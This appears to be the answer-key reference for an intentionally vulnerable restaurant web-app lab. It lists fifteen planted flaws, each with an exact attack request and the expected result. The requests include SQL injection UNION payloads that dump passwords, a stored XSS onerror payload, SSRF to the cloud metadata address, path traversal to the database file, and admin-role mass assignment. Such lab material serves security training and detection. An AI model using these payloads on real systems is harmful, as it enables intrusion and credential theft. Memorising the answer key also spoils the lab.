# Known Findings — xVulnv2 Restaurant Vulnerability Lab

> Manual verification reference for all 15 known vulnerabilities embedded in the application.  
> Validation follows behavior-based detection (no payload string matching).

---

## Trigger Engine — Schema Reference (v1.5.0)

The trigger detection engine supports two modes:

| Mode | Behaviour |
|---|---|
| `legacy` | Exact hardcoded `trigger` string (manual/human reference only) |
| `pattern` | Regex/heuristic `triggers` array evaluated against request+response snapshots |
| `both` | Pattern engine runs first; legacy string returned as fallback if no match (default) |

Set the active mode via the `TRIGGER_ENGINE` environment variable.

### Detection Strategies

| Strategy | Input | Description |
|---|---|---|
| `pattern_match` | `request.url` / `request.body` / `request.headers` / `request.method` | Regex match on request data |
| `response_body_match` | Response body | Regex match on response body |
| `status_code` | Response status | Checks for presence/absence of HTTP codes |
| `timing_anomaly` | `duration_ms` | Fires if response exceeds threshold (default 2000ms) |
| `field_presence` | Response body (JSON) | Checks if a key exists anywhere in the JSON tree |
| `error_signature` | Response body | Matches known DB/server error strings |
| `response_diff` | *(stub)* | Future: compare baseline vs. attack response |

### Evaluate API — Usage

```
POST http://localhost:4443/api/trigger/evaluate
Content-Type: application/json

{
  "vuln_id": "V01",
  "request": {
    "method": "GET",
    "url": "/api/menu/1 UNION SELECT 1,username,password FROM users--",
    "headers": {},
    "body": ""
  },
  "response": {
    "status": 200,
    "body": "[{\"id\":1,\"name\":\"admin\",\"description\":\"admin@thelocalplate.com\"}]",
    "duration_ms": 45
  }
}
```

**Response:**
```json
{
  "vuln_id": "V01",
  "matched": true,
  "matches": [
    { "strategy": "pattern_match",       "heuristic_name": "sql_metachar_in_url",   "description": "..." },
    { "strategy": "response_body_match", "heuristic_name": "email_in_response",     "description": "..." }
  ],
  "evaluated_at": "2026-04-08T14:00:00Z"
}
```

Retrieve all definitions: `GET http://localhost:4443/api/vulns`

---

## V01 — SQL Injection (Menu Item by ID)

**Endpoint:** `GET /api/menu/{id}`  
**CWE:** CWE-89 | **OWASP:** A03:2021 | **Severity:** Critical

### Request
```http
GET /api/menu/1 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK)
```json
[
  {"id":1,"name":"admin","description":"admin@thelocalplate.com","price":0,"category":"Admin@2024!","image_url":"/static/assets/img/pizza.jpg","available":1},
  ...
]
```

### Validation Logic
- Response should contain rows where `name` or `description` fields contain email addresses or plaintext passwords
- More rows returned than expected for a single item lookup

---

## V02 — SQL Injection (Search)

**Endpoint:** `GET /api/search?q=`  
**CWE:** CWE-89 | **OWASP:** A03:2021 | **Severity:** Critical

### Request
```http
GET /api/search?q=' UNION SELECT 1,username,email,password,category,image_url,1 FROM users-- HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK)
```json
[
  {"id":1,"name":"admin","description":"admin@thelocalplate.com","price":0,...},
  ...
]
```

### Validation Logic
- Response contains rows not present in `menu_items` table
- Fields contain user data (emails, passwords) from the `users` table

---

## V03 — Stored XSS (Reviews)

**Endpoint:** `POST /api/reviews`  
**CWE:** CWE-79 | **OWASP:** A03:2021 | **Severity:** High

### Step 1 — Store Payload
```http
POST /api/reviews HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: restaurant_session=<valid_session>

{
  "menu_item_id": 1,
  "rating": 5,
  "comment": "<img src=x onerror=alert(document.domain)>"
}
```

### Step 2 — Trigger
```http
GET /api/reviews?item_id=1 HTTP/1.1
Host: localhost:8080
```

### Expected Response
```json
[{"id":11,"comment":"<img src=x onerror=alert(document.domain)>", ...}]
```

### Validation Logic
- Payload stored verbatim in DB
- When rendered in browser via `innerHTML`, triggers script/DOM execution
- Observable effect: alert box, DOM modification, or outbound HTTP request to controlled server

---

## V04 — SSRF (Menu Import)

**Endpoint:** `POST /api/import-menu`  
**CWE:** CWE-918 | **OWASP:** A10:2021 | **Severity:** High

### Request
```http
POST /api/import-menu HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

### Alternative (Internal service)
```json
{"url": "http://127.0.0.1:6379/"}
```

### Expected Response (200 OK)
```json
{"bytes_fetched": 283, "content_type": "text/plain", "message": "menu data imported"}
```

### Validation Logic
- `bytes_fetched > 0` confirms server made the outbound request
- Response does not return an error, confirming successful fetch of internal URL

---

## V05 — IDOR (Order Access)

**Endpoint:** `GET /api/orders/{id}`  
**CWE:** CWE-639 | **OWASP:** A01:2021 | **Severity:** High

### Setup
- Login as alice (user_id=2)
- Order ID 3 belongs to bob (user_id=3)

### Request
```http
GET /api/orders/3 HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_session>
```

### Expected Response (200 OK)
```json
{"id":3,"user_id":3,"total":44.98,"status":"completed","note":"", ...}
```

### Validation Logic
- Response contains `user_id: 3` even though logged-in user is `user_id: 2`
- No ownership check performed; any authenticated user can read any order

---

## V06 — IDOR (Profile Access + Sensitive Data Exposure)

**Endpoint:** `GET /api/user/profile?id=`  
**CWE:** CWE-639, CWE-200 | **OWASP:** A01:2021, A02:2021 | **Severity:** High

### Setup
- Login as any non-admin user (e.g., alice, user_id=2)
- Try to fetch admin profile (id=1)

### Request
```http
GET /api/user/profile?id=1 HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_session>
```

### Expected Response (200 OK)
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@thelocalplate.com",
  "password": "Admin@2024!",
  "role": "admin",
  "created_at": "..."
}
```

### Validation Logic
- `password` field present in response with plaintext value
- `id` in response differs from requesting user's session ID

---

## V07 — Broken Authentication (Admin Routes)

**Endpoint:** `GET /admin/orders`, `GET /admin/users`  
**CWE:** CWE-285 | **OWASP:** A01:2021 | **Severity:** Critical

### Request (Without Any Session)
```http
GET /admin/orders HTTP/1.1
Host: localhost:8080
X-Admin-Token: restaurant-admin-2024
```

### Expected Response (200 OK)
```json
[{"id":1,"username":"alice","total":32.98,"status":"completed", ...}, ...]
```

### Alternative — Any Logged-In User (Without Admin Role)
```http
GET /admin/users HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_non_admin_session>
```

### Validation Logic
- Full order/user list returned without proper role verification
- `/admin/users` response includes `password` fields for all users
- No session role check (`role != "admin"`) is enforced

---

## V08 — Sensitive Data Exposure (Password in Response)

**Endpoint:** `GET /api/user/profile`  
**CWE:** CWE-200 | **OWASP:** A02:2021 | **Severity:** High

*(See V06 above — the password field is exposed in all profile responses.)*

### Validation Logic
- `password` field exists in JSON response body
- Value is plaintext (passwords stored unhashed)

---

## V09 — Security Misconfiguration (Debug Endpoint)

**Endpoint:** `GET /api/debug/info`  
**CWE:** CWE-489 | **OWASP:** A05:2021 | **Severity:** Critical

### Request
```http
GET /api/debug/info HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK)
```json
{
  "admin_token": "restaurant-admin-2024",
  "db_path": "./restaurant.db",
  "environment": "production",
  "goroutines": 4,
  "heap_alloc": 1234567,
  "menu_items": 10,
  "orders": 10,
  "session_key": "restaurant-secret-key-2024",
  "users": 5,
  "version": "1.4.2"
}
```

### Validation Logic
- Response includes `admin_token` and `session_key` in plaintext
- No authentication required to access this endpoint
- `environment` claims "production" yet debug info is exposed

---

## V10 — Mass Assignment (Privilege Escalation via Role)

**Endpoint:** `POST /register?role=admin`  
**CWE:** CWE-915 | **OWASP:** A04:2021 | **Severity:** Critical

### Request
```http
POST /register?role=admin HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"username": "hacker", "email": "hacker@evil.com", "password": "Hack3r!"}
```

### Expected Response (201 Created)
```json
{"message": "account created successfully", "user_id": 6}
```

### Verification
```http
GET /api/user/profile?id=6 HTTP/1.1
Cookie: restaurant_session=<any_auth_session>
```

### Validation Logic
- Profile of new user shows `"role": "admin"`
- User gains access to `/admin/*` endpoints
- Role was set by attacker-controlled query parameter, not server logic

---

## V11 — Broken Function Level Authorization (Menu Delete)

**Endpoint:** `DELETE /api/menu/{id}`  
**CWE:** CWE-285 | **OWASP:** A01:2021 | **Severity:** High

### Request (As Non-Admin User)
```http
DELETE /api/menu/1 HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_non_admin_session>
```

### Expected Response (200 OK)
```json
{"message": "item removed from menu"}
```

### Verification
```http
GET /api/menu/1 HTTP/1.1
→ 404 Not Found (item removed)
```

### Validation Logic
- Non-admin user successfully deletes menu item
- Item no longer appears in `GET /api/menu`

---

## V12 — Missing Rate Limiting (Login Brute Force)

**Endpoint:** `POST /login`  
**CWE:** CWE-307 | **OWASP:** A07:2021 | **Severity:** Medium

### Request (Repeated)
```http
POST /login HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"email": "admin@thelocalplate.com", "password": "wrong-password-N"}
```

### Expected Behavior
- All requests return `401 Unauthorized` — no `429 Too Many Requests`
- No account lockout after N failed attempts

### Validation Logic
- Send 100 requests within 60 seconds
- No response ever returns 429
- No increasing delay pattern in response times

---

## V13 — CSRF (Cross-Site Order Placement)

**Endpoint:** `POST /api/orders`  
**CWE:** CWE-352 | **OWASP:** A01:2021 | **Severity:** Medium

### Attack Scenario
Victim is logged in to the restaurant app. Attacker sends cross-origin request:

```http
POST /api/orders HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: restaurant_session=<victim_cookie>
Origin: http://attacker.com

{"items": [{"menu_item_id": 1, "quantity": 5}], "note": ""}
```

### Expected Response (201 Created)
```json
{"message": "order placed successfully", "order_id": 11, "total": 74.95}
```

### Validation Logic
- Request succeeds without CSRF token validation
- No `Csrf-Token` or equivalent header checked
- Order appears in victim's order history

---

## V14 — Path Traversal (File Download)

**Endpoint:** `GET /api/files?name=`  
**CWE:** CWE-22 | **OWASP:** A01:2021 | **Severity:** High

### Request
```http
GET /api/files?name=../../go.mod HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK, text/plain)
```
module xvulnv2

go 1.21
...
```

### Deeper Traversal
```http
GET /api/files?name=../../restaurant.db
```

### Validation Logic
- Response contains content of file outside `./uploads/` directory
- Content matches expected file (e.g., `module xvulnv2` in go.mod)

---

## V15 — Insecure Deserialization (Cart Restore)

**Endpoint:** `POST /api/cart/restore`  
**CWE:** CWE-502 | **OWASP:** A08:2021 | **Severity:** Medium

### Payload Construction
```
Original: {"items":[{"id":1,"name":"Pizza","qty":1,"price":14.99}],"discount":100,"promo":"STAFFONLY","total":0}
Base64:   eyJpdGVtcyI6W3siaWQiOjEsIm5hbWUiOiJQaXp6YSIsInF0eSI6MSwicHJpY2UiOjE0Ljk5fV0sImRpc2NvdW50IjoxMDAsInByb21vIjoiU1RBRkZPTkxZIiwidG90YWwiOjB9
```

### Request
```http
POST /api/cart/restore HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: restaurant_session=<valid_session>

{"cart_data": "eyJpdGVtcyI6W3siaWQiOjEsIm5hbWUiOiJQaXp6YSIsInF0eSI6MSwicHJpY2UiOjE0Ljk5fV0sImRpc2NvdW50IjoxMDAsInByb21vIjoiU1RBRkZPTkxZIiwidG90YWwiOjB9"}
```

### Expected Response (200 OK)
```json
{
  "cart": {
    "discount": 100,
    "items": [{"id":1,"name":"Pizza","price":14.99,"qty":1}],
    "promo": "STAFFONLY",
    "total": 0
  },
  "message": "cart restored"
}
```

### Validation Logic
- `discount: 100` and `total: 0` echoed back without server-side recalculation
- Attacker can manipulate prices, quantities, discounts via serialized payload
- Server trusts client-side data without validation

---

## Summary Table

| ID  | Type | Endpoint | Severity |
|-----|------|----------|----------|
| V01 | SQL Injection | GET /api/menu/{id} | Critical |
| V02 | SQL Injection | GET /api/search?q= | Critical |
| V03 | Stored XSS | POST /api/reviews | High |
| V04 | SSRF | POST /api/import-menu | High |
| V05 | IDOR | GET /api/orders/{id} | High |
| V06 | IDOR + Sensitive Data | GET /api/user/profile?id= | High |
| V07 | Broken Auth | GET /admin/orders, /admin/users | Critical |
| V08 | Sensitive Data Exposure | GET /api/user/profile | High |
| V09 | Security Misconfiguration | GET /api/debug/info | Critical |
| V10 | Mass Assignment | POST /register?role= | Critical |
| V11 | Broken Function Auth | DELETE /api/menu/{id} | High |
| V12 | No Rate Limiting | POST /login | Medium |
| V13 | CSRF | POST /api/orders | Medium |
| V14 | Path Traversal | GET /api/files?name= | High |
| V15 | Insecure Deserialization | POST /api/cart/restore | Medium |
